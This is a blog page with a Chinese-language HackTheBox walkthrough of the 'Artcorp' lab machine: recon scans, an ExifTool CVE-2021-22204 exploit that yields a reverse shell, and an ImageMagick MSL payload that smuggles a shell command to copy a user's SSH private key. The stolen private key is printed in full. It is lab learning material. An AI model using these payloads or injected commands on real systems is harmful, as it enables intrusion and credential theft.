@@ -1,0 +1,681 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:12345678910111213# Nmap 7.92SVN scan initiated Tue Jun  7 18:07:19 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt -T4 10.10.11.140Nmap scan report for 10.10.11.140Host is up (0.42s latency).Not show">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Artcorp">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Artcorp.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="Recon:12345678910111213# Nmap 7.92SVN scan initiated Tue Jun  7 18:07:19 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt -T4 10.10.11.140Nmap scan report for 10.10.11.140Host is up (0.42s latency).Not show">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607182202676.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607193850687.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607194242503.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.070Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.006Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607182202676.png">
+  
+  
+  
+  <title>HTB Walkthrough - Artcorp - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Artcorp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          90 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Artcorp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.92SVN scan initiated Tue Jun  7 18:07:19 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt -T4 10.10.11.140</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.140</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">|_http-title: Did not follow redirect to http://artcorp.htb</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://google.com/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Tue Jun  7 18:19:42 2022 -- 1 IP address (1 host up) scanned in 743.04 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607182202676.png" srcset="/img/loading.gif" lazyload alt="image-20220607182202676"></p>
+<p>除了三个用户名之外都是假按钮。也没什么路径信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">200      GET       86l      263w     4427c http://artcorp.htb/</span><br><span class="line">301      GET        7l       20w      234c http://artcorp.htb/assets =&gt; http://artcorp.htb/assets/</span><br><span class="line">301      GET        7l       20w      238c http://artcorp.htb/assets/img =&gt; http://artcorp.htb/assets/img/</span><br><span class="line">403      GET        7l       20w      199c http://artcorp.htb/server-status</span><br><span class="line">[<span class="comment">####################] - 2m     90000/90000   0s      found:4       errors:334    </span></span><br><span class="line">[<span class="comment">####################] - 2m     30000/30000   188/s   http://artcorp.htb/ </span></span><br><span class="line">[<span class="comment">####################] - 2m     30000/30000   212/s   http://artcorp.htb/assets </span></span><br><span class="line">[<span class="comment">####################] - 2m     30000/30000   236/s   http://artcorp.htb/assets/img </span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H <span class="string">&quot;Host: FUZZ.artcorp.htb&quot;</span> -mc 200 -u http://artcorp.htb/ </span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.5.0 Kali Exclusive &lt;3</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://artcorp.htb/</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.artcorp.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 215ms]</span></span><br><span class="line"><span class="string">:: Progress: [4989/4989] :: Job [1/1] :: 161 req/sec :: Duration: [0:00:31] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>
+
+<p>新域名有一个外链，点击后会跳转到一个页面：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607193850687.png" srcset="/img/loading.gif" lazyload alt="image-20220607193850687"></p>
+<p>上传图片会显示图片元数据：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607194242503.png" srcset="/img/loading.gif" lazyload alt="image-20220607194242503"></p>
+<p>跟exiftool是一模一样的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ exiftool kali.jpg            </span><br><span class="line">ExifTool Version Number         : 12.41</span><br><span class="line">File Name                       : kali.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 26 KiB</span><br><span class="line">File Modification Date/Time     : 2022:06:01 17:12:43+08:00</span><br><span class="line">File Access Date/Time           : 2022:06:07 13:20:39+08:00</span><br><span class="line">File Inode Change Date/Time     : 2022:06:04 19:26:31+08:00</span><br><span class="line">File Permissions                : -rwxrwxrwx</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">Resolution Unit                 : None</span><br><span class="line">X Resolution                    : 1</span><br><span class="line">Y Resolution                    : 1</span><br><span class="line">Current IPTC Digest             : 84aa901aedb881ba9d6e719153213216</span><br><span class="line">Coded Character Set             : UTF8</span><br><span class="line">Application Record Version      : 0</span><br><span class="line">Copyright Notice                : © GNULinux - http://www.redbubble.com/people/GNULinu</span><br><span class="line">Image Width                     : 800</span><br><span class="line">Image Height                    : 800</span><br><span class="line">Encoding Process                : Progressive DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 1</span><br><span class="line">Image Size                      : 800x800</span><br><span class="line">Megapixels                      : 0.640</span><br></pre></td></tr></table></figure>
+
+<p>尝试搜索一下该工具漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit exiftool             </span><br><span class="line">---------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                  |  Path</span><br><span class="line">---------------------------------------------------------------- ---------------------------------</span><br><span class="line">ExifTool 12.23 - Arbitrary Code Execution                       | linux/local/50911.py</span><br><span class="line">---------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">---------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Paper Title                                                    |  Path</span><br><span class="line">---------------------------------------------------------------- ---------------------------------</span><br><span class="line">ExifTool Djvu Code Execution - Paper                            | docs/english/49881-exiftool-djvu</span><br><span class="line">---------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>确实有，但是不太好用，不过在github还能搜到另一个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/convisolabs/CVE-2021-22204-exiftool/blob/master/exploit.py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exploit.py</span><br><span class="line">    1 image files updated</span><br></pre></td></tr></table></figure>
+
+<p>将生成的新图片放上去。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnp  9090</span><br><span class="line">listening on [any] 9090 ...</span><br><span class="line">connect to [10.10.16.8] from (UNKNOWN) [10.10.11.140] 47294</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ </span></span><br></pre></td></tr></table></figure>
+
+<p>直接读取user.txt读取不出来，不过还有一个提权漏洞CVE-2020-29599：用pspy监听能看到会周期性执行convert_images.sh，在usr&#x2F;local&#x2F;bin目录下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">2022/06/07 10:00:01 CMD: UID=0    PID=870    | /usr/sbin/CRON -f </span><br><span class="line">2022/06/07 10:00:01 CMD: UID=1000 PID=871    | /bin/bash /usr/local/bin/convert_images.sh </span><br><span class="line">2022/06/07 10:00:01 CMD: UID=0    PID=875    | /bin/sh -c <span class="built_in">rm</span> /var/www/dev01.artcorp.htb/convert_images/* </span><br><span class="line">2022/06/07 10:00:01 CMD: UID=0    PID=874    | /usr/sbin/CRON -f </span><br><span class="line">2022/06/07 10:00:01 CMD: UID=0    PID=873    | /usr/sbin/CRON -f </span><br><span class="line">2022/06/07 10:00:01 CMD: UID=1000 PID=872    | /usr/local/bin/mogrify -format png *.* </span><br><span class="line">2022/06/07 10:00:01 CMD: UID=0    PID=876    | /usr/sbin/CRON -f </span><br><span class="line">2022/06/07 10:00:01 CMD: UID=0    PID=877    | /bin/sh -c <span class="built_in">rm</span> /var/www/dev01.artcorp.htb/metaview/uploads/* </span><br><span class="line">2022/06/07 10:00:01 CMD: UID=0    PID=878    | /bin/sh -c <span class="built_in">rm</span> /tmp/* </span><br><span class="line">2022/06/07 10:00:01 CMD: UID=0    PID=879    | /bin/sh -c <span class="built_in">cp</span> -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf </span><br><span class="line">2022/06/07 10:00:01 CMD: UID=1000 PID=880    | /bin/bash /usr/local/bin/convert_images.sh </span><br><span class="line">2022/06/07 10:01:01 CMD: UID=0    PID=882    | /usr/sbin/CRON -f </span><br><span class="line">2022/06/07 10:01:01 CMD: UID=0    PID=881    | /usr/sbin/CRON -f </span><br><span class="line">2022/06/07 10:01:01 CMD: UID=0    PID=883    | /usr/sbin/CRON -f </span><br><span class="line">2022/06/07 10:01:01 CMD: UID=0    PID=884    | /usr/sbin/CRON -f </span><br><span class="line">2022/06/07 10:01:01 CMD: UID=0    PID=885    | </span><br><span class="line">2022/06/07 10:01:01 CMD: UID=1000 PID=887    | </span><br><span class="line">2022/06/07 10:01:01 CMD: UID=1000 PID=886    | /bin/bash /usr/local/bin/convert_images.sh </span><br><span class="line">2022/06/07 10:01:01 CMD: UID=1000 PID=888    | pkill mogrify </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@meta:/usr/local/bin$ <span class="built_in">chmod</span> +x ./convert_images.sh </span><br><span class="line"><span class="built_in">chmod</span>: changing permissions of <span class="string">&#x27;./convert_images.sh&#x27;</span>: Operation not permitted</span><br><span class="line">www-data@meta:/usr/local/bin$ <span class="built_in">cat</span> convert_images.sh </span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/dev01.artcorp.htb/convert_images/ &amp;&amp; /usr/local/bin/mogrify -format png *.* 2&gt;/dev/null</span><br><span class="line">pkill mogrify</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@meta:/var/www$ mogrify -version</span><br><span class="line">Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org</span><br><span class="line">Copyright: © 1999-2020 ImageMagick Studio LLC</span><br><span class="line">License: https://imagemagick.org/script/license.php</span><br><span class="line">Features: Cipher DPC HDRI OpenMP(4.5) </span><br><span class="line">Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag-txt"><a href="#flag-txt" class="headerlink" title="flag.txt:"></a>flag.txt:</h2><p>运行者是1000UID，应该是thoam用户，我尝试根据漏洞信息制作payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;image authenticate=<span class="string">&#x27;ff&quot; `echo $(cat /home/thomas/.ssh/id_rsa)&gt; /dev/shm/0wned`;&quot;&#x27;</span>&gt;</span><br><span class="line">  &lt;<span class="built_in">read</span> filename=<span class="string">&quot;pdf:/etc/passwd&quot;</span>/&gt; </span><br><span class="line">  &lt;get width=<span class="string">&quot;base-width&quot;</span> height=<span class="string">&quot;base-height&quot;</span> /&gt; </span><br><span class="line">  &lt;resize geometry=<span class="string">&quot;400x400&quot;</span> /&gt; &lt;write filename=<span class="string">&quot;test.png&quot;</span> /&gt; </span><br><span class="line">  &lt;svg width=<span class="string">&quot;700&quot;</span> height=<span class="string">&quot;700&quot;</span> xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>xmlns:xlink=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span><br><span class="line">  &lt;image xlink:href=<span class="string">&quot;msl:poc.svg&quot;</span> height=<span class="string">&quot;100&quot;</span> width=<span class="string">&quot;100&quot;</span>/&gt; </span><br><span class="line">  &lt;/svg&gt;</span><br><span class="line">&lt;/image&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY----- </span><br><span class="line">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 </span><br><span class="line">bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
